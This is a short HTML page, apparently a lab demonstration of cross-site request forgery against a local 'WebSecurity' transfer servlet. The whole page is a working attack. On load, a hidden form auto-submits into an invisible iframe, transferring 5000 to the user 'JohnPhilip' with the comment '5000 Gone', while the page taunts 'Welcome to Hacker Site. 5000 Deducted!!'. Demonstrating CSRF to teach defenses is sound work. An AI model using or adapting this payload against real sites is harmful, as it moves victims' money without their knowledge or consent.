<html>
<body onload="document.forms[0].submit();">
<h1>Welcome to Hacker Site. 5000 Deducted!!</h1>
<iframe name="hidden_frame" id="hidden_frame" style="display:none;"></iframe>
<form id="myform" action="http://localhost:8080/WebSecurity/TransferServlet" method="POST" target="hidden_frame">
    <input type="hidden" name="transferAmount" value="5000"/>
    <input type="hidden" name="toUser" value="JohnPhilip"/>
    <input type="hidden" name="userComment" value="5000 Gone" />
</form>
</body>
</html>